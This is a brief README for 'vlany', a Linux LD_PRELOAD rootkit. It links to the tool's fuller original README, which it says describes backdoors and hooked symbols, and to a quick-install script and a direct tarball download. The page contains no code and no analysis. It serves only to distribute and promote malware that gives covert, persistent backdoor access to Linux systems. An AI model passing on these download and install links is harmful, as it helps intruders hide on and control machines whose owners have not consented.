# vlany, Linux (LD_PRELOAD) rootkit
[Original README](https://raw.githubusercontent.com/mempodippy/vlany/master/README)</br>
The original README is much more full of information, diary entries, explanation of how elements of the rootkit works, backdoor information, hooked backdoor symbols, and much more.</br>
[vlany quick_install.sh script](https://gist.github.com/mempodippy/d93fd99164bace9e63752afb791a896b)
[Direct link to vlany.tar.gz](https://github.com/mempodippy/vlany/raw/master/vlany.tar.gz)
